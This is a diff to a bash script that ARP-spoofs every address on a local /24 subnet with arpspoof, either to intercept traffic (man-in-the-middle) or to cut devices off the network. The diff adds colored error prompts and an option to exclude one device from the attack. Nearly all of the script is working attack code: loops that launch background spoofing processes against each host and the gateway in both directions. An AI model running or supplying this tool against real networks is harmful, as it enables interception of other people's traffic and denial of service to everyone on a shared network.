@@ -75,7 +75,7 @@ printf "Specify the interface \033[0;93m(\033[0mwlan0\033[0;93m/\033[0meth0\033[
 read INTERFACE1 INTERFACE2
 while [ $INTERFACE1$INTERFACE2 != "wlan0" ] && [ $INTERFACE1$INTERFACE2 != "eth0" ] && [ $INTERFACE1$INTERFACE2 != "usb0" ] && [ $INTERFACE1$INTERFACE2 != "bnep0" ]
   do
-    printf "Wrong input, retry again\n"
+    printf "\033[0;91mWrong input, retry again\033[0m \n"
     printf "Specify the interface \033[0;93m(\033[0mwlan0\033[0;93m/\033[0meth0\033[0;93m/\033[0musb0\033[0;93m/\033[0mbnep0\033[0;93m)\033[0m \033[0;91m$(tput blink)---> \033[0m"
     read INTERFACE1 INTERFACE2
   done
@@ -87,7 +87,7 @@ printf "Choose the purpose of spoofing \033[0;93m(\033[0mmitm\033[0;93m/\033[0mc
 read PURPOSE1 PURPOSE2
 while [ $PURPOSE1$PURPOSE2 != "mitm" ] && [ $PURPOSE1$PURPOSE2 != "cutoff" ]
   do
-    printf "Wrong input, retry again\n"
+    printf "\033[0;91mWrong input, retry again\033[0m \n"
     printf "Choose the purpose of spoofing \033[0;93m(\033[0mmitm\033[0;93m/\033[0mcutoff\033[0;93m)\033[0m \033[0;91m$(tput blink)---> $Color_Off"
     read PURPOSE1 PURPOSE2
   done
@@ -100,6 +100,39 @@ elif [ $PURPOSE1$PURPOSE2 == "cutoff" ]
     sysctl net.ipv4.ip_forward=0
 fi
 
+printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
+printf "\n"
+
+#------------------------------------------------------------------------------------------------
+#Update 1.2
+#Adding device exceptions (ipv4)
+printf "Want to add one exception between the targets? (Y/N) \033[0;91m$(tput blink)---> $Color_Off"
+read EXCEPTION_STTS
+
+while [ $EXCEPTION_STTS != Y ] && [ $EXCEPTION_STTS != y ] && [ $EXCEPTION_STTS != N ] && [ $EXCEPTION_STTS != n ]
+  do
+    printf "\033[0;91mWrong input, retry again\033[0m \n"
+    printf "Want to add one exception between the targets? (Y/N) \033[0;91m$(tput blink)---> $Color_Off"
+    read EXCEPTION_STTS
+  done
+
+if [ $EXCEPTION_STTS == "y" ] || [ $EXCEPTION_STTS == "Y" ]
+
+  then 
+    printf "Enter the 4th byte of the exception device (Example 154 for 192.168.1.154) \033[0;91m$(tput blink)---> $Color_Off"
+    read Fbyte
+    while [ "$Fbyte" -gt 254 ] || [ "$Fbyte" -lt 1 ]
+      do 
+        printf "\033[0;91mWrong input, retry again\033[0m \n"
+        printf "Enter the 4th byte of the exception device (Example 154 for 192.168.1.154) \033[0;91m$(tput blink)---> $Color_Off"
+        read Fbyte
+      done
+elif [ $EXCEPTION_STTS == "n" ] || [ $EXCEPTION_STTS == "N" ]
+  then
+    printf "\033[0;93mNo device exception added. $Color_Off \n"
+fi
+#--------------------------------------------------------------------------------------------------------
+printf "\n"
 echo -e "\033[0;91m$(tput blink)Proceeding in 3 seconds...$Color_Off"
 sleep 3
 printf "\033[0;91m__________________________________________________________________________$Color_Off\n"
@@ -108,33 +141,50 @@ printf "\n"
 #The arp spoofing must be two-sided:
 #router-->victims exculding router and localhost from victims 
 #victims-->router excluding localhost from victims
-
 i=1
 j=1
 
-while [ "$i" -le  254 ]
-  do
-
-    if [ "$i" -eq $D ]
-      then 
+if [ $EXCEPTION_STTS == "y" ] || [ $EXCEPTION_STTS == "Y" ]
+  then
+    while [ "$i" -le  254 ]
+      do
+        if [ "$i" -ne $D ] && [ "$i" -ne $Fbyte ]
+          then
+            arpspoof -i $INTERFACE1$INTERFACE2 -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
+        fi 
         i=$(( $i+1 ))
-    fi
-
-    arpspoof -i $INTERFACE1$INTERFACE2 -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
-    i=$(( $i+1 ))
-  done
-
-while [ "$j" -le  254 ]
-  do
-
-    if [ "$j" -eq $D ] || [ "$j" -eq $H ]
-      then 
+      done
+    #--------------------------------------------------------------------------------------------
+    while [ "$j" -le  254 ]
+      do
+        if [ "$j" -ne $D ] && [ "$j" -ne $H ] && [ "$j" -ne $Fbyte ]
+          then 
+            arpspoof -i $INTERFACE1$INTERFACE2 -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
+        fi
         j=$(( $j+1 ))
-    fi
+      done
 
-    arpspoof -i $INTERFACE1$INTERFACE2 -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
-    j=$(( $j+1 ))
-  done
+
+elif [ $EXCEPTION_STTS == "n" ] || [ $EXCEPTION_STTS == "N" ]
+  then
+    while [ "$i" -le  254 ]
+      do
+        if [ "$i" -ne $D ]
+          then
+            arpspoof -i $INTERFACE1$INTERFACE2 -t $GATEWAY_IP $A.$B.$C.$i 2>/dev/null 1>/dev/null &
+        fi 
+        i=$(( $i+1 ))
+      done
+    #--------------------------------------------------------------------------------------------
+    while [ "$j" -le  254 ]
+      do
+        if [ "$j" -ne $D ] && [ "$j" -ne $H ]
+          then 
+            arpspoof -i $INTERFACE1$INTERFACE2 -t $A.$B.$C.$j $GATEWAY_IP 2>/dev/null 1>/dev/null &
+        fi
+        j=$(( $j+1 ))
+      done
+fi
 
 printf "\033[0;96mThe process is running in background :D\n$Color_Off"
 printf "\n"
